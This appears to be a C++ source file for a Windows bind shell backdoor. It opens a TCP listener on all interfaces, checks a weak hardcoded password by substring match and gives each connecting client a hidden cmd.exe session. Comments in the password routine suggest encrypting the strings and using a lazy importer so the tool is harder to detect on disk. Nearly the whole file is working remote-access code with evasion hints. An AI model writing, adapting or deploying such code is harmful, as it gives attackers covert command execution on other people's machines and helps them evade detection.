#include "pch.h"
#include "BindShell.h"

BindShell::BindShell(UINT16 port)
{
    this->port = port;
	WSAStartup(MAKEWORD(2, 2), &m_wsaData);
}

BindShell::~BindShell()
{
    WSACleanup();
}

BOOL BindShell::BingusAuthorize(SOCKET clientSocket)
{
    const char* ask = "PWD: ";
    const char* allow = "yea";
    const char* deny = "nah";

    char recvPwd[1024] = { 0 };

    send(clientSocket, ask, strlen(ask), 0);

    int bytesRecv = recv(clientSocket, recvPwd, sizeof(recvPwd), 0);
    if (bytesRecv <= 0)
        return false;

    /*
     * these strings can be XOR encrypted using something like skCrypter
     * https://github.com/skadro-official/skCrypter
     * would prevent anyone from finding the passwd on disc (wont help if dumped from memory)
     * 
     * also unrelated but maybe smth like a lazy loader would help hide even moar
     * https://github.com/JustasMasiulis/lazy_importer
     * 
     * instead the password is gonna be the same as our accept output LOL
    */
    if (std::string(recvPwd, bytesRecv).find(allow) != -1)
    {
        send(clientSocket, allow, strlen(allow), 0);
        return true;
    }
    else 
    {
        send(clientSocket, deny, strlen(deny), 0);
        return false;
    }
}

DWORD APIENTRY BindShell::BingusSessionHandler(LPVOID lpParameter)
{
    SOCKET clientSocket = (SOCKET)lpParameter;

    if (BingusAuthorize(clientSocket))
        RunCmdBindShell((LPWSTR)L"cmd.exe", (HANDLE)clientSocket, true, CREATE_NO_WINDOW);

    closesocket(clientSocket);

    return 0;
}

void BindShell::Bingus()
{
    SOCKET serverSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    if (serverSocket == INVALID_SOCKET)
        return;

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(port);

    if (bind(serverSocket, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) 
    {
        closesocket(serverSocket);
        OutputDebugString(L"bind error :(");

        return;
    }

    listen(serverSocket, SOMAXCONN);
    while (true)
    {
        int c = sizeof(sockaddr_in);
        sockaddr_in client;
        SOCKET clientSocket = WSAAccept(serverSocket, NULL, NULL, NULL, 0);
        if (clientSocket == INVALID_SOCKET)
            continue;

        // THIS SHIT IS BLOCKING
        // MessageBox(0, L"accepted!", L"bingus", 1);

        OutputDebugString(L"accepted!");
        CreateThread(NULL, 0, BingusSessionHandler, (LPVOID)clientSocket, 0, NULL);
    }

    closesocket(serverSocket);
}
